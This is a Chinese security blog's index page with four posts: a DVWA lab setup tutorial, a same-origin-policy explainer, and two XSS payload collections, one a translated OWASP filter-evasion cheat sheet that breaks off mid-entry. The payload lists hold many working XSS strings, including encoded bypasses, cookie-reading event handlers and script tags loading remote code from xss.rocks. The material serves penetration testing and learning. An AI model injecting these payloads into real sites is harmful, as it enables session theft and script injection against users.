<!doctype html>
<html class="no-js" lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>
    
  lonelyorのblog
  
  </title>
  
  
  
  <link href="atom.xml" rel="alternate" title="lonelyorのblog" type="application/atom+xml">
    <link rel="stylesheet" href="asset/css/foundation.min.css" />
    <link rel="stylesheet" href="asset/css/docs.css" />
    <script src="asset/js/vendor/modernizr.js"></script>
    <script src="asset/js/vendor/jquery.js"></script>
  <script src="asset/highlightjs/highlight.pack.js"></script>
  <link href="asset/highlightjs/styles/github.css" media="screen, projection" rel="stylesheet" type="text/css">
  <script>hljs.initHighlightingOnLoad();</script>
<script type="text/javascript">
  function before_search(){
    var searchVal = 'site:www.lonelyor.org/lonelyorNotes ' + document.getElementById('search_input').value;
    document.getElementById('search_q').value = searchVal;
    return true;
  }
</script>
  </head>
  <body class="antialiased hide-extras">
    
    <div class="marketing off-canvas-wrap" data-offcanvas>
      <div class="inner-wrap">


<nav class="top-bar docs-bar hide-for-small" data-topbar>


  <section class="top-bar-section">
  <div class="row">
      <div style="position: relative;width:100%;"><div style="position: absolute; width:100%;">
        <ul id="main-menu" class="left">
        
        <li id=""><a target="_self" href="index.html">主页</a></li>
        
        <li id=""><a target="_self" href="archives.html">归档</a></li>
        
        <li id=""><a target="_self" href="about.html">关于</a></li>
        
        </ul>

        <ul class="right" id="search-wrap">
          <li>
<form target="_blank" onsubmit="return before_search();" action="https://google.com/search" method="get">
    <input type="hidden" id="search_q" name="q" value="" />
    <input tabindex="1" type="search" id="search_input"  placeholder="Search"/>
</form>
</li>
          </ul>
      </div></div>
  </div>
  </section>

</nav>

        <nav class="tab-bar show-for-small">
  <a href="javascript:void(0)" class="left-off-canvas-toggle menu-icon">
    <span> &nbsp; lonelyorのblog</span>
  </a>
</nav>

<aside class="left-off-canvas-menu">
      <ul class="off-canvas-list">
        
        <li><a target="_self" href="index.html">主页</a></li>
        
        <li><a target="_self" href="archives.html">归档</a></li>
        
        <li><a target="_self" href="about.html">关于</a></li>
        

    <li><label>Categories</label></li>

        
            <li><a href="Web%E6%94%BB%E9%98%B2.html">Web攻防</a></li>
        
            <li><a href="%E5%A5%87%E6%B7%AB%E5%B7%A7%E6%8A%80.html">奇淫巧技</a></li>
        
            <li><a href="%E7%B3%BB%E7%BB%9F%E6%94%BB%E9%98%B2.html">系统攻防</a></li>
        
            <li><a href="CTF.html">CTF</a></li>
        
            <li><a href="%E8%99%9A%E6%8B%9F%E5%AE%9E%E9%AA%8C%E5%AE%A4.html">虚拟实验室</a></li>
         

      </ul>
    </aside>

<a class="exit-off-canvas" href="#"></a>


        <section id="main-content" role="main" class="scroll-container">
        
       

 <script type="text/javascript">
	$(function(){
		$('#menu_item_index').addClass('is_active');
	});
</script>
<div class="row">
	<div class="large-8 medium-8 columns">
		<div class="markdown-body home-categories">
		
			<div class="article">
                <a class="clearlink" href="15446897185202.html">
                
                  <h1>从零开始的DVWA之环境搭建</h1>
                  <div class="a-content">
                      
                      <div class="a-content-text">
                        
                        	<blockquote>
<p>文章写于2017年7月6日，很久之前的东西了。</p>
</blockquote>

<p>title: 从零开始的DVWA之环境搭建<br/>
author: lonelyor<br/>
author_id: defaultAuthorId<br/>
language: zh-CN<br/>
tags:<br/>
  - DVWA<br/>
  - 环境搭建<br/>
  - 渗透测试<br/>
categories:<br/>
  - DVWA</p>

<h2 id="toc_0">date: 2017-07-06 20:05:00</h2>

<h2 id="toc_1">0X01 主机配置</h2>

<p>　　操作系统：Ubuntu-Kylin-16.04-LTS_x64（VritualBox虚拟机）<br/><br/>
　　相关组件：XAMPP+DVWA    </p>

<h2 id="toc_2">0X02 DVWA简介</h2>

<p>　　DVWA是一个用来进行安全脆弱性鉴定（练习挖洞）的PHP/MySQL应用。旨在帮助安全爱好者（黑客白客红客白帽子黑帽子绿帽子等）测试自己的专业技能和工具提供合法的环境（不要瞎搞别人网站，这样不好...），提升技术能力的同时更好的维护比特世界的和平。       </p>

<h2 id="toc_3">0X03 XAMPP简介</h2>

<p>　　XAMPP（Apache+MySQL+PHP+PERL）是一个功能强大的建站集成软件包。这个软件包原来的名字是 LAMPP，但是为了避免误解，最新的几个版本就改名为 XAMPP 了。由于DWVA需要PHP环境，嗯，就由XAMMP来守护了。    </p>

<h2 id="toc_4">0X04 XAMPP和DVWA安装</h2>

<p>　　首先访问官网 <a href="https://www.apachefriends.org/zh_cn/download.html">https://www.apachefriends.org/zh_cn/download.html</a> 然后点击下载：<br/><br/>
<img src="media/15446897185202/1.png" alt="1"/></p>

<p>接着就会弹个框：<br/><br/>
<img src="media/15446897185202/2.png" alt="2"/></p>

<p>去一趟茅房回来就下完了，你要是嫌弃7下的太慢，可以去下5.6，速度会快些，接着就是安装。　　　　<br/>
　　安装过程如下（记得加权限，然后）：　　　　<br/>
<img src="media/15446897185202/3.png" alt="3"/><br/>
　　　　<br/>
<img src="media/15446897185202/4.png" alt="4"/><br/>
　<br/>
一直点击next就行了……　　　　<br/>
<img src="media/15446897185202/5.png" alt="5"/><br/>
　　　<br/>
　　这里告诉我们XAMPP被安装在/opt/lampp文件（linux一切皆文件）里面。最后点击Finish就完成了安装。<br/><br/>
启动XAMPP    </p>

<pre class="line-numbers"><code class="language-shell">#cd /opt/lampp
#./manager-linxu-x64.run
或者
#/opt/lamp/./manage-linux-x64.run  
</code></pre>

<p><img src="media/15446897185202/6.png" alt="6"/></p>

<p>下面我们开始安装DWVA：<br/><br/>
　　首先我们登录官网 <a href="http://www.dvwa.co.uk/">http://www.dvwa.co.uk/</a> 点击DOWNLOAD下载最新版的DWVA，是一个zip文件。<br/><br/>
<img src="media/15446897185202/7.png" alt="7"/></p>

<p>然后将文件解压（提取）到/opt/lamp/htdocs/目录下<br/><br/>
<img src="media/15446897185202/8.png" alt="8"/></p>

<p><img src="media/15446897185202/9.png" alt="9"/></p>

<p>接着我们打开XAMPP的MySQL（默认只开了Apache）<br/><br/>
<img src="media/15446897185202/10.png" alt="10"/></p>

<p>然后访问 http://localhost/DVWA-master/index.php 诶!?报错<br/><br/>
<img src="media/15446897185202/11.png" alt="11"/></p>

<p>　　嗯，根据报错信息可知是配置文件有问题（废话啰），同样的根据提示我们知道要将文件名config.inc.php.dist改为config.inc.php（这里其实涉及到一个linux命令copy的用法，具体可自行百度： <a href="http://www.linuxdiyf.com/viewarticle.php?id=38590">http://www.linuxdiyf.com/viewarticle.php?id=38590</a> ）。改完名字之后就可以访问了，页面会自动跳转到： http://localhost/DVWA-master/setup.php 。然后我们用gedit打开这个文件config.inc.php看看是个什么东西，(⊙o⊙)哦原来是配置文件（废话连篇有木有），我们修改两个地方（1、数据库密码，我知道玩lol的你输入这个密码肯定飞快，不过我是玩dota的。2、安全等级设置为low，简单点容易玩，默认是难的。）     　<br/><br/>
<img src="media/15446897185202/12.png" alt="12"/></p>

<p>打开之后长这样：<br/><br/>
<img src="media/15446897185202/13.png" alt="13"/></p>

<p>怎么玩呢？我不知道啊，于是我瞎点了几下，<br/><br/>
<img src="media/15446897185202/14.png" alt="14"/></p>

<p>MMP又报错了，根据提示我们知道问题出在red部分,嗯，我们去修改一下所有带红色的地方的配置。<br/><br/>
1、搞定PHP function allow_url_include：Disabled<br/><br/>
找到php的配置文件，修改allow_url_include=Off 为allow_url_include=on（参考<a href="http://php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include%EF%BC%89">http://php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include）</a><br/><br/>
<img src="media/15446897185202/15.png" alt="15"/></p>

<p>然后修改/opt/lamp/etc/php.ini<br/><br/>
<img src="assets/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84DVWA%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/16.png" alt="16"/>     <img src="media/15446897185202/16.png" alt="16"/></p>

<p>2、解决reCAPTCHA key，配置文件里面有个谷歌连接，点进去剩下的估计你也看得懂应该知道该怎么做额。<br/><br/>
<img src="media/15446897185202/17.png" alt="17"/></p>

<p><img src="media/15446897185202/18.png" alt="18"/></p>

<p>3、解决最后的两个NO<br/><br/>
<img src="assets/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84DVWA%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/19.png" alt="19"/>     <img src="media/15446897185202/19.png" alt="19"/></p>

<p>我们给这两个文件加权，运行命令：<br/><br/>
<img src="media/15446897185202/20.png" alt="20"/></p>

<p>然后点击<br/><br/>
<img src="assets/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84DVWA%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/21.png" alt="21"/>    <img src="media/15446897185202/21.png" alt="21"/></p>

<p>纳尼!?<br/><br/>
<img src="assets/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84DVWA%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/22.png" alt="22"/>     <img src="media/15446897185202/22.png" alt="22"/></p>

<p>只好回头再看看XAMPP的数据库配置文件，你会发现他的password默认是被注释了，我们取消注释。<br/><br/>
<img src="assets/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84DVWA%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/23.png" alt="23"/>      <img src="media/15446897185202/23.png" alt="23"/></p>

<p>最后你会发现不管怎么搞还是报错……这就尴尬了……<br/>
经过尝试，我发现以下配置可以进入登录界面。<br/>
XAMPP配置如下：<br/><br/>
<img src="media/15446897185202/24.png" alt="24"/></p>

<p>密码还是按照默认的注释掉<br/><br/>
<img src="media/15446897185202/25.png" alt="25"/></p>

<p>DVWA配置如下：<br/><br/>
<img src="media/15446897185202/26.png" alt="26"/></p>

<p>接着你就能进入登录界面了。恭喜！<br/>
http://localhost/DVWA-master/login.php<br/><br/>
<img src="assets/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84DVWA%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/27.png" alt="27"/>    <img src="media/15446897185202/27.png" alt="27"/></p>

<p>输入账号密码然后登录就能愉快的玩耍了。<br/><br/>
<img src="media/15446897185202/28.png" alt="28"/></p>

<p>什么？你进不去？账号密码是什么？预知后事如何，请听下回分解。    </p>

<p>下集预告：<br/><br/>
　　欢迎来到DVWA的世界，这是你的第一关，登录破解…… </p>

                        
                      </div>
                  </div>
                </a>
                <div class="read-more clearfix">
                  <div class="more-left left">
                  
                    <span class="date">2018/12/13 16:28 下午</span>
                    <span>posted in&nbsp;</span> 
          				  
          					    <span class="posted-in"><a href='%E8%99%9A%E6%8B%9F%E5%AE%9E%E9%AA%8C%E5%AE%A4.html'>虚拟实验室</a></span>
          				   
                  </div>
                  <div class="more-right right">
                  <span class="comments">
                      

                       
                  </span>
                  </div>
                </div>
              </div><!-- article -->
        
			<div class="article">
                <a class="clearlink" href="15446893463166.html">
                
                  <h1>xss常用payload</h1>
                  <div class="a-content">
                      
                      <div class="a-content-text">
                        
                        	<blockquote>
<p>这是很久之前写的东西了，忘记是从哪里收集总结来的了。抱歉没法贴源地址了。</p>
</blockquote>

<p>在平时的工作中，经常遇到需要手工测试xss漏洞的地方，每次都将代码输入一遍（特别是用手机的时候）会显得比较麻烦，因此写这篇文档来记录一下平时可能用到的xss攻击代码，以备不时之需，复制粘贴总比打字方便一些。以下部分代码收集自网络（全部测试过，可以直接使用）。</p>

<p>xss漏洞是常见的web安全问题之一，当网站未做任何防御时，输入<script>alert(‘xss’)</script>就会弹出上述弹窗。但是通常情况下，网站都会对一些字符进行过滤，以预防xss攻击，这时就需要运用到一些xss绕过技巧。</p>

<p>1.大小写混合绕过<br/>
顾名思义，通过修改攻击代码大小写进行绕过。虽然javascript对大小写敏感但是html不敏感，javascript操作html的标签不敏感。代码示例：<code>&lt;sCrIpt&gt;alErt(‘xss’)&lt;/ScRiPT&gt;</code></p>

<p>2.闭合标签绕过</p>

<p>单引号很多时候都能起到闭合语句的作用，有时候我们通过关闭标签可以使xss生效。</p>

<p>3.HEX编码来绕过</p>

<p>对语句进行Hex编码，如<code>&lt;script&gt;alert(“xss”);&lt;/script&gt;</code>可以转换为<code>3c7363726970743e616c65727428e2809c787373e2809d293b3c2f7363726970743e</code></p>

<p>4.Javascript URL</p>

<p>链接标签里可以通过在 URL 中使用 javascript:… 来执行 JavaScript：</p>

<p><code>&lt;a href=”javascript:alert(‘test’)”&gt;link&lt;/a&gt;</code></p>

<p>稍微高级一点的写法还有：<code>&lt;a href=”javascript:alert(‘xss’)”&gt;link&lt;/a&gt;</code>，通过url编码使它依旧可以被浏览器执行但又不匹配正则表达式。</p>

<p>5.根据之前绕过方法的启发，我们可以通过修改标签和编码或者函数来修改所用的攻击代码</p>

<p>===&gt;常用代码如下：</p>

<p><code>&lt;script&gt;alert(8888)&lt;/script&gt;</code></p>

<p><code>&lt;script&gt;confirm(8888)&lt;/script&gt;</code></p>

<p><code>&lt;script&gt;prompt(8888)&lt;/script&gt;</code></p>

<p><code>&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(8888)&lt;/script&gt;</code></p>

<p><code>&lt;script src=data:text/javascript,alert(8888)&gt;&lt;/script&gt;</code></p>

<p><code>&lt;script src=&amp;#100&amp;#97&amp;#116&amp;#97:text/javascript,alert(8888)&gt;&lt;/script&gt;</code></p>

<p><code>&lt;script&gt;alert(String.fromCharCode(49,49))&lt;/script&gt;</code></p>

<p><code>&lt;script&gt;alert(/8888/.source)&lt;/script&gt;</code></p>

<p><code>&lt;script&gt;setTimeout(alert(8888),0)&lt;/script&gt;</code></p>

<p>===&gt;以下为触发xss，即鼠标移动到输出的字符上（或点击字符）时，即会引发xss。</p>

<p><code>&lt;anytag onmouseover=alert(1)&gt;h</code></p>

<p><code>&lt;anytag onclick=alert(2)&gt;h</code></p>

<p><code>&lt;a onmouseover=alert(3)&gt;h</code></p>

<p><code>&lt;a onclick=alert(4)&gt;h</code></p>

<p><code>&lt;a href=javascript:alert(5)&gt;h</code></p>

<p><code>&lt;button/onclick=alert(6)&gt;h</code></p>

<p><code>formaction=javascript&amp;colon;alert(7)&gt;h</code></p>

<p><code>&lt;form/action=javascript:alert(8)&gt;&lt;input/type=submit&gt;</code></p>

<p><code>&lt;form onsubmit=alert(9)&gt;&lt;button&gt;h</code></p>

<p><code>&lt;form onsubmit=alert(10)&gt;&lt;button&gt;h</code></p>

<p><code>&lt;img src=x onerror=alert(11)&gt; 29</code></p>

<p><code>&lt;body/onload=alert(12)&gt;</code></p>

<p><code>&lt;body onscroll=alert(13)&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</code></p>

<p><code>&lt;iframe/onload=alert(document.domain)&gt;&lt;/iframe&gt;</code></p>

<p><code>&lt;IFRAME SRC=”javascript:alert(14);”&gt;&lt;/IFRAME&gt;</code></p>

<p><code>&lt;meta http-equiv=”refresh” content=”0;</code></p>

<p><code>url=data:text/html,&lt;script&gt;alert(15)&lt;/script&gt;”&gt;</code></p>

<p><code>&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&gt;&lt;/object&gt;</code>　　　　＃此为base64编码，有兴趣可以试试其他编码方式</p>

<p><code>&lt;input onfocus=alert(16) autofocus&gt;</code>　　　　＃使用这行攻击代码会无限弹xss</p>

<p><code>&lt;input onblur=alert(17) autofocus&gt;&lt;input autofocus&gt;</code></p>

                        
                      </div>
                  </div>
                </a>
                <div class="read-more clearfix">
                  <div class="more-left left">
                  
                    <span class="date">2018/12/13 16:22 下午</span>
                    <span>posted in&nbsp;</span> 
          				  
          					    <span class="posted-in"><a href='xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC.html'>xss跨站脚本</a></span>
          				   
                  </div>
                  <div class="more-right right">
                  <span class="comments">
                      

                       
                  </span>
                  </div>
                </div>
              </div><!-- article -->
        
			<div class="article">
                <a class="clearlink" href="15446892905759.html">
                
                  <h1>同源策略</h1>
                  <div class="a-content">
                      
                      <div class="a-content-text">
                        
                        	<blockquote>
<p>description: 摘自网络，出处忘了。</p>
</blockquote>

<p>同源策略（SOP，Same Origin Policy），两个页面的【协议】【域名】【端口】都相同，则两个页面具有相同的源，任何一个不同都是不同源的。<br/>
举例：<br/>
假设源是：<code>http://store.company.com/dir/page.html</code><br/>
同源的是：<br/>
<code>http://store.company.com/dir2/other.html</code><br/>
<code>http://store.company.com/dir/inner/another.html</code><br/>
不同源的是：<br/>
<code>https://store.company.com/secure.html</code> 不同协议 ( https和http )<br/>
<code>http://store.company.com:81/dir/etc.html</code> 不同端口 ( 81和80)<br/>
<code>http://news.company.com/dir/other.html</code> 不同域名 ( news和store )</p>

<h2 id="toc_0">同源策略控制内容</h2>

<p><strong>同源策略是禁止读取HTTP回复，并不会禁止脚本执行，也不会禁止HTTP请求，因此在防御CSRF上作用是非常有限的，因为CSRF在请求发出的时候就已经达到了攻击的目的。</strong><br/>
一般情况下，静态资源通常不受同源策略限制，如有js/css/jpg/png等。</p>

<p>同源策略控制了不同源之间的交互，例如在使用<code>XMLHttpRequest</code>或<code>img</code>标签时则会受到同源策略的约束，这些交互通常分为三类。</p>

<ul>
<li>通常允许跨域写（Cross-origin writes），例如链接（links），重定向以及表单提交。少数特定的HTTP请求需要添加&quot;预检请求&quot;<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Preflighted_requests">preflight</a>如OPTIONS来查询可用的方法。</li>
<li>通常允许跨域资源嵌入（Cross-origin embedding）</li>
<li>通常 <strong>不允许</strong> 跨域读（Cross-origin reads），但常可以通过内嵌资源来巧妙的进行读取访问。例如可以读取嵌入图片的高度和宽度，调用内嵌脚本的方法，或<a href="https://www.grepular.com/Abusing_HTTP_Status_Codes_to_Expose_Private_Information">availability of an embedded resource</a></li>
</ul>

<p>下面是可能嵌入跨域资源的示例：<br/>
<code>&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;</code> 标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。<br/>
<code>&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;</code> 标签嵌入CSS。由于CSS的<a href="http://scarybeastsecurity.blogspot.dk/2009/12/generic-cross-browser-cross-domain.html">松散的语法规则</a>，CSS的跨域需要一个设置正确的Content-Type 消息头。不同浏览器有不同的限制： <a href="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/gg622939(v=vs.85)">IE</a>, <a href="https://www.mozilla.org/en-US/security/advisories/mfsa2010-46/">Firefox</a>, <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=9877">Chrome</a>, <a href="https://support.apple.com/zh-cn/HT4070">Safari</a> (跳至CVE-2010-0051)部分 和 <a href="https://security.opera.com/">Opera</a>。<br/>
<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/img"><code>&lt;img&gt;</code></a>嵌入图片。支持的图片格式包括PNG,JPEG,GIF,BMP,SVG,...<br/>
<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/video"><code>&lt;video&gt;</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/audio"><code>&lt;audio&gt;</code></a>嵌入多媒体资源。<br/>
<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/object"><code>&lt;object&gt;</code></a>, <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/embed"><code>&lt;embed&gt;</code></a> 和 <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/applet"><code>&lt;applet&gt;</code></a> 的插件。<br/>
<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/@font-face">@font-face</a> 引入的字体。一些浏览器允许跨域字体（ cross-origin fonts），一些需要同源字体（same-origin fonts）。<br/>
<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/frame"><code>&lt;frame&gt;</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe"><code>&lt;iframe&gt;</code></a> 载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。</p>

                        
                      </div>
                  </div>
                </a>
                <div class="read-more clearfix">
                  <div class="more-left left">
                  
                    <span class="date">2018/12/13 16:21 下午</span>
                    <span>posted in&nbsp;</span> 
          				  
          					    <span class="posted-in"><a href='xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC.html'>xss跨站脚本</a></span>
          				   
                  </div>
                  <div class="more-right right">
                  <span class="comments">
                      

                       
                  </span>
                  </div>
                </div>
              </div><!-- article -->
        
			<div class="article">
                <a class="clearlink" href="15446891028198.html">
                
                  <h1>xss测试备忘录</h1>
                  <div class="a-content">
                      
                      <div class="a-content-text">
                        
                        	<blockquote>
<p>description: 此备忘录来自：<a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a><br/>
列出了一系列可用于绕过某些XSS防御过滤器的XSS攻击。</p>
</blockquote>

<ul>
<li><p>最基本的payload</p>
<p><code>&lt;SCRIPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;</code></p></li>
<li><p>xss定位</p>
<p>这个测试将在包含html、js、url、script string等多个上线文中执行</p>
<p><code>javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;/[]/+alert(1)//&#39;&gt;</code></p></li>
<li><p>图像xss</p>
<p><code>&lt;IMG SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p></li>
<li><p>没有引号和分号</p>
<p><code>&lt;IMG SRC=javascript:alert(&#39;XSS&#39;)&gt;</code></p></li>
<li><p>不区分大小写</p>
<p><code>&lt;IMG SRC=JaVaScRiPt:alert(&#39;XSS&#39;)&gt;</code></p></li>
<li><p>html实体编码</p>
<p><code>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</code></p></li>
<li><p>重音符(esc下面tab上面那个符号)</p>
<pre class="line-numbers"><code class="language-javascript">&lt;IMG SRC=`javascript:alert(&quot;RSnake says, &#39;XSS&#39;&quot;)`&gt;
</code></pre></li>
<li><p>错误的a标签</p>
<p><code>&lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt;</code></p>
<p>chrome喜欢替换丢失的引号</p>
<p><code>&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt;</code></p></li>
<li><p>错误的img标签</p>
<p><code>&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;</code></p></li>
<li><p>fromCharCode()方法(根据Unicode值显示字符串)</p>
<p><code>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</code></p></li>
<li><p>默认src标签，用于检查src过滤器</p>
<p>这能绕过大多数src过滤器。在事件方法中插入javascript也适用于使用 form、iframe、input、embed等元素的任何htm标记类型注入，它还允许替换标记类型的任何相关事件，如onblur、onlick</p>
<p><code>&lt;IMG SRC=# onmouseover=&quot;alert(&#39;xxs&#39;)&quot;&gt;</code></p></li>
<li><p>将默认src留空</p>
<p><code>&lt;IMG SRC= onmouseover=&quot;alert(&#39;xxs&#39;)&quot;&gt;</code></p></li>
<li><p>完全不使用默认src</p>
<p><code>&lt;IMG onmouseover=&quot;alert(&#39;xxs&#39;)&quot;&gt;</code></p></li>
<li><p>出错时提示</p>
<p><code>&lt;IMG SRC=/ onerror=&quot;alert(String.fromCharCode(88,83,83))&quot;&gt;&lt;/img&gt;</code></p>
<p><code>&lt;img src=1 onerror=alert(1)&gt;</code></p>
<p>js编码</p>
<p><code>&lt;img src=x onerror=&quot;&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&quot;&gt;</code></p></li>
<li><p>十进制html字符引用</p>
<p>所有在img标签中使用javascript代码的xss示例，在Gecko渲染引擎模式下都无法在Firefox或Netscape 8.1+ 中使用。</p>
<pre class="line-numbers"><code class="language-markup">&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;
&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
</code></pre>
<p>变种(不带分号)</p>
<p>通常在过滤 &#xxx; 的情况下有效</p>
<p>过滤的写法——<code>$tmp_string =~ s/.*\&amp;#(\d+);.*/$1/;</code></p>
<pre class="line-numbers"><code class="language-markup">&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;
#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
</code></pre></li>
<li><p>十六进制html字符引用，不带分号</p>
<p><code>&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</code></p></li>
<li><p>嵌入式标签</p>
<p><code>&lt;IMG SRC=&quot;jav    ascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p>
<p>变种(编码)</p>
<p>水平标签</p>
<p><code>&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p>
<p>换行符</p>
<p><code>&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p>
<p>回车符</p>
<p><code>&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p></li>
<li><p>null字符或者%00</p>
<p>可以在终端使用以下代码生成 xss payload</p>
<p><code>perl -e &#39;print &quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&#39; &gt; out</code></p>
<p>如下：</p>
<p><code>&lt;IMG SRC=java^@script:alert(&quot;XSS&quot;)&gt;</code></p></li>
<li><p>空格和元字符在 javascript代码在图像中作为 xss payload之前</p>
<p><code>&lt;IMG SRC=&quot; &amp;#14;  javascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p></li>
<li><p>非字母非数字的xss</p>
<p><code>&lt;SCRIPT/XSS SRC=&quot;http://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;</code></p>
<p>变种(Gecko渲染引擎允许在<em>事件处理程序和等号之间</em>使用除字母，数字或封装字符（如引号，尖括号等等）之外的任何字符)</p>
<pre class="line-numbers"><code class="language-javascript">&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
</code></pre>
<p>IE只允许标记和参数之间是不带空格的斜杠</p>
<p><code>&lt;SCRIPT/SRC=&quot;http://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;</code></p></li>
<li><p>无关的开放式括号</p>
<p>某些检测引擎会首先使用匹配的开启和关闭尖括号对，然后通过内部标记进行比较；双斜杠注释掉结束的无关括号以阻止javascript错误。</p>
<p><code>&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT</code></p></li>
<li><p>没有关闭脚本标签</p>
<p><code>&lt;SCRIPT SRC=http://xss.rocks/xss.js?&lt; B &gt;</code></p>
<p>变种(半开html/javascript标签)</p>
<p>半开的标签会扰乱html逻辑，影响payload后面的html，可以用来绕过NIDS正则表达式<code>/((\%3D)|(=))[^\n]*((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/</code></p>
<p><code>&lt;IMG SRC=&quot;javascript:alert(&#39;XSS&#39;)&quot;</code></p>
<p>变种(双开标签)</p>
<p>firefox会受影响，netscape不会</p>
<p><code>&lt;iframe src=http://xss.rocks/scriptlet.html &lt;</code></p></li>
<li><p>javascript逃逸</p>
<p>当输出javascript中的信息的代码这样写<code>&lt;SCRIPT&gt;var a=&quot;$ENV{QUERY_STRING}&quot;;&lt;/SCRIPT&gt;</code>并且想要将自己的javascript代码注入服务器端应用程序并逃脱某些引用时，可以通过逃避转移字符来规避它。当以下代码注入时，会被读取为<code>&lt;SCRIPT&gt;var a=&quot;\\&quot;;alert(&#39;XSS&#39;);//&quot;;&lt;/SCRIPT&gt;</code></p>
<p>拆开解读：</p>
<pre class="line-numbers"><code class="language-javascript">&lt;SCRIPT&gt;
var a=&quot;\\&quot;;    合并前面的双引号<br/>
alert(&#39;XSS&#39;);<br/>
//&quot;;<br/>
&lt;/SCRIPT&gt;    转义后面的双引号
</code></pre>
<p><code>\&quot;;alert(&#39;XSS&#39;);//</code></p>
<p>另一种方法，如果嵌入的数据应用了对的json或javascript转义，而不是html编码，则</p>
